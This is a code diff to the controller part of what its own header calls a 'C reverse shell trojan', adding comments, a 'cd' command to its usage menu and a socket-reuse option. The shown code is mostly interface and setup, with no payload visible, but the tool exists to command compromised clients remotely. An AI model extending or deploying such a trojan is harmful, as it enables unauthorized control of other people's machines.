@@ -1,17 +1,39 @@
+/*
+ * p4p1-s_linuc.c -> make linux
+ *
+ * Made by p4p1
+ *
+ * C reverse shell trojan
+ * Do not use this for elegal purposes
+ ****/
+
 #include "papi.h"
 #include "papimain.h"
 #include "papiarg.h"
 
 int main(int argc, char *argv[])
 {
+	/*
+	 * Declare the main variables
+	 **/
 	struct server_info inf;
 
+	/*
+	 *Initialize the variables and read program sys files
+	 **/
 	init_variables(&inf, argv);
+	/*
+	 * Check current arguments and send them to the correct
+	 * Main function.
+	 **/
 	check_arg(&inf, argv, argc);
 
 	return 0;
 }
 
+/*
+ * Usage function
+ ***/
 void usage(char * exname)
 {
 
@@ -26,12 +48,16 @@ void usage(char * exname)
 	printf("          *url -> dowload from a url the path is requiered\n");
 	printf("                  by this prompt #!url >\n");
 	printf("          &q   -> quit the program correctly\n");
+	printf("	  cd   -> Change directory\n");
 	printf("          !ch  -> Change client who you are connected to\n");
 	printf("Command Usage:\n");
 	printf("      %s -h    -> show this message\n", exname);
 
 }
 
+/*
+ *Wrapper for perror / error handling function
+ ***/
 void error(char * msg, int num)
 {
 	endwin();
@@ -39,6 +65,9 @@ void error(char * msg, int num)
 	exit(num);
 }
 
+/*
+ * Initialize all variables and cfg files
+ ***/
 void init_variables(struct server_info * inf, char * argv[])
 {
 
@@ -100,18 +129,28 @@ void init_variables(struct server_info * inf, char * argv[])
 		error("Unknown ip", -1);
 	}
 
+	int enable = 1;
+	if (setsockopt(inf->s, SOL_SOCKET, SO_REUSEADDR, &enable, sizeof(int)) < 0)
+    		error("setsockopt(SO_REUSEADDR) failed", -1);
+
 	fclose(portfile);
 	fclose(ipfile);
 	fclose(unamefile);
 
 }
 
+/*
+ * Print text to screen
+ **/
 void pscreen(char * str, int x, int y)
 {
 	mvprintw(y, x, "%s", str);
 	refresh();
 }
 
+/*
+ * Exit the program correctly function
+ ***/
 void quit(int c, int s)
 {
 	int row, col;
@@ -131,6 +170,9 @@ void quit(int c, int s)
 	exit(c);
 }
 
+/*
+ * Function to print logo on screen
+ ***/
 void printlogo(struct server_info * inf)
 {
 
@@ -145,6 +187,9 @@ void printlogo(struct server_info * inf)
 
 }
 
+/*
+ * Clear main part of the screen function
+ ***/
 void clearmain()
 {
 	int row, col, i, q;
@@ -157,6 +202,9 @@ void clearmain()
 	}
 }
 
+/*
+ * Clear prompt row for the next input
+ ***/
 void clastrow()
 {
 
@@ -167,16 +215,4 @@ void clastrow()
 		mvprintw(row-1, i, " ");
 	}
 
-}
-
-int reusesock(struct server_info * inf)
-{
-	int yes=1;
-	//char yes='1'; // use this under Solaris
-
-	if (setsockopt(inf->s, SOL_SOCKET, SO_REUSEADDR, &yes, sizeof(yes)) == -1) {
-	    return 1;
-	}
-
-	return 0;
 }
